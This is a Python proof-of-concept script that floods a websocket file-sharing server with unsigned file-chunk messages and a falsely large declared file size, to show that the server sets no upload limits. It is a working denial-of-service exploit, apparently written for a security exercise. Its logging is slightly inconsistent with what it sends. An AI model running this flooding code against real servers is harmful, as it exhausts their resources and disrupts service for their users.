"""
Proof of Concept: Unbounded File Send

This script demonstrates a vulnerability where the server fails to impose limits on file uploads,
allowing an attacker to flood the system with a large number of small file chunks without proper
size or rate limiting. This can lead to resource exhaustion, denial of service, or storage attacks.

In a secure system, file uploads should be bounded by maximum size, rate limits,
and proper validation to prevent abuse.
"""

import asyncio
import hashlib
import json
import time

import websockets


def now(): return int(time.time() * 1000)


async def main(host="127.0.0.1", port=8080, user="flooder", chunks=2000, chunk_bytes=400):
    uri = f"ws://{host}:{port}/ws"
    async with websockets.connect(uri, max_size=None) as ws:
        await ws.send(json.dumps({"type": "USER_HELLO", "from": user, "to": "server", "ts": now(),
                                  "payload": {"client": "poc", "pubkey": "fake"}, "sig": ""}))
        file_id = "deadbeef-0000-0000-0000-feedfacepoc"
        data = b"A" * chunk_bytes * chunks
        sha = hashlib.sha256(data).hexdigest()
        print(f"[proxy] sending {chunks} chunks of {len(data) * 1000} bytes to ws://{host}:{port}/ws")

        # Advertise comically large total size
        await ws.send(json.dumps({"type": "FILE_START", "from": user, "to": "public", "ts": now(),
                                  "payload": {"file_id": file_id, "name": "big.bin", "size": len(data) * 1000,
                                              "sha256": sha, "mode": "public"},
                                  "sig": ""}))
        # Send many chunks (no server-side blocking/limits)
        for i in range(chunks):
            await ws.send(json.dumps({"type": "FILE_CHUNK", "from": user, "to": "public", "ts": now(),
                                      "payload": {"file_id": file_id, "index": i, "ciphertext": "A" * 16}, "sig": ""}))

        await ws.send(json.dumps({"type": "FILE_END", "from": user, "to": "public", "ts": now(),
                                  "payload": {"file_id": file_id}, "sig": ""}))

        await asyncio.sleep(2)
        print(f"[OK] Sent {chunks} chunks without any server rejection.")


if __name__ == "__main__":
    asyncio.run(main())
